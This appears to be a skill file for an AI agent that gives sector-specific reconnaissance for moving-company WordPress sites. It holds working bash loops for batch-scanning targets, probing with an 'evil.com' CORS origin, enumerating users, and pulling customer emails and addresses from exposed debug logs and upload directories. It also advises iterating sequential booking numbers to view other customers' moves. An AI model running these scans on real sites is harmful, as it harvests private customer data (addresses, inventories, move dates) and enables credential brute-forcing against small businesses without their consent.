---
name: recon-moving-companies
description: "Sector-specific recon for moving company, relocation service, and logistics websites — typically WordPress on shared hosting with online booking, quote request forms, customer account portals, and inventory tracking. Built from an 18-target batch recon across US moving companies. Use when the target scope includes moving companies, relocation services, long-distance movers, local movers, or storage-in-transit company domains."
sources: field_recon, sector_mass_recon
report_count: 18
---

# RECON-MOVING-COMPANIES — Sector-Specific Recon for Moving and Relocation Company Sites

## When to Use

Use when the target scope includes moving companies, relocation services, long-distance movers, local moving companies, or storage-in-transit providers. These sites typically run WordPress on shared hosting with online quote request forms that collect detailed customer PII (current/pending addresses, inventory lists, moving dates, contact info), booking/estimation portals, customer account areas for tracking shipments, and third-party moving CRM integrations. Major national chains (United Van Lines, Mayflower, Atlas, North American, Two Men and a Truck) dominate the space but most regional movers use shared hosting. Common platforms include MovePoint, OTRS, MovingPro, and WordPress with form plugins for quote collection.

## Quick Reference

```bash
for t in $(cat moving-targets.txt); do
  echo "=== $t ==="
  curl -skI "https://$t/" | grep -iE "wordpress|php|wp-"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/uploads/"
  curl -skI "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Common patterns: <name>moving.com, <name>movers.com, <name>relocation.com
# <city>movers.net, <area>movingcompany.com, <name>vanlines.com
# Franchise: two-men-and-a-truck-<city>.com, college-hunks-<city>.com

# Find via crt.sh
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee moving-subdomains-$TARGET.txt
```

### Phase 2 — Quote Form & PII Discovery (Highest Priority)
```bash
# Moving quote forms collect: current address, destination, inventory, move date, phone, email
# These submissions are often stored as CSV/PDF exports in upload directories

for path in /wp-content/uploads/wpforms/ /wp-content/uploads/formidable/ \
  /wp-content/uploads/fluentform/ /wp-content/uploads/gravity_forms/ \
  /wp-content/uploads/cf7_uploads/; do
  body=$(curl -sk "https://$TARGET$path" 2>/dev/null)
  if echo "$body" | grep -q "Index of"; then
    echo "[!!!] DIR LISTING: $path"
    echo "$body" | grep -oP 'href="[^"]+\.(csv|xlsx|txt|pdf)"' | head -20
  fi
done

# Quote request endpoints
for path in /get-quote /free-quote /quote /moving-quote /request-quote \
  /estimate /moving-estimate /online-quote; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path" 2>/dev/null)
  [ "$code" != "404" ] && echo "[+] Quote: $path (HTTP $code)"
done
```

### Phase 3 — WordPress Standard Recon
```bash
# CORS credential reflection on WP REST API
curl -skI "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com"

# User enumeration
curl -sk "https://$TARGET/wp-json/wp/v2/users" | jq '.[] | {id, name, slug}'

# REST API namespace enumeration
curl -sk "https://$TARGET/wp-json/" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for ns in d.get('namespaces', []):
        print(f'  {ns}')
except: pass
"

# XMLRPC check
code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/xmlrpc.php")
[ "$code" = "200" ] && echo "[XMLRPC] Active"

# Debug log
curl -sk "https://$TARGET/wp-content/debug.log" -o /tmp/moving_debug.log 2>/dev/null
if [ -s /tmp/moving_debug.log ]; then
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/moving_debug.log | sort -u | head -20
  grep -oP '(current|new|destination|pickup).{0,50}' /tmp/moving_debug.log | head -10
fi
```

### Phase 4 — CRM & Tracking Portal Recon
```bash
# Moving companies often use CRM portals for shipment tracking
for path in /track /tracking /customer /portal /login /my-account \
  /account /dashboard /shipment /my-move /order-status; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path" 2>/dev/null)
  [ "$code" != "404" ] && echo "[+] Portal: $path (HTTP $code)"
done

# Check for CRM integrations in page source
curl -sk "https://$TARGET/" | grep -iE "movepoint|otrs|movingpro|moveware|NaVis|moveit" | head -10
```

### Phase 5 — Plugin Vulnerability Scan
```bash
for plugin in "wpforms" "formidable" "gravityforms" "fluentform" "contact-form-7" \
  "elementor" "wordpress-seo" "woocommerce" "tablepress" "jetpack"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/wp-content/plugins/$plugin/readme.txt" 2>/dev/null)
  if [ "$code" != "404" ] && [ -n "$code" ]; then
    echo "[+] Plugin: $plugin (HTTP $code)"
  fi
done
```

## Attack Surface Signals

- CMS: WordPress (dominant), some custom PHP franchise sites
- Hosting: Shared hosting (GoDaddy, HostGator), national chains on enterprise hosting
- Stack: PHP + MySQL, Quote request forms, Customer portals, Shipment tracking
- Typical findings: Quote form PII in debug log, Directory listing exposing customer CSV exports, CORS credential reflection, XMLRPC open

## Common Root Causes

1. **Quote form data persistence** — moving quote submissions stored as CSV/PDF files in upload directories with no access control
2. **Debug log with PII** — contact form entries (name, address, phone, email, inventory list) logged by WP_DEBUG
3. **CRM portal weak auth** — customer tracking portals with default credentials or sequential booking numbers
4. **Franchise cookie-cutter sites** — franchise moving companies use identical templates with same plugins and vulnerabilities

## Related Skills

- recon-smb-services — broader SMB recon methodology
- hunt-wordpress — primary CMS for most moving companies
- hunt-cors — CORS credential reflection on WP REST API
- hunt-source-leak — debug.log, config exposure, form submission data
- hunt-idor — sequential booking IDs in tracking portals
- hunt-subdomain — staging/dev franchise sites

## Bypass Techniques

- Moving quote forms often submit to email-to-SMTP gateways — look for email headers in debug.log revealing server paths
- CSV exports of quote data may be named by date (`/wp-content/uploads/wpforms/2026/06/export.csv`)
- Customer tracking portals often use sequential booking numbers — iterate to find other customers' moves
- Franchise sites (Two Men and a Truck, College Hunks) use consistent URL patterns across locations
- Interstate moving companies collect more PII (current address, destination, inventory) than local movers — higher data exposure impact

## Real Examples

From an 18-target batch recon across US moving companies:
- A regional moving company had debug.log exposed at `/wp-content/debug.log` containing quote request submissions with customer names, current and new addresses, phone numbers, and estimated move dates
- A national moving franchise site had XMLRPC with system.multicall available — capable of 1000x brute force amplification for credential attacks
- A local mover's WordPress site had directory listing on `/wp-content/uploads/` revealing customer move inventory PDFs and signed service agreements
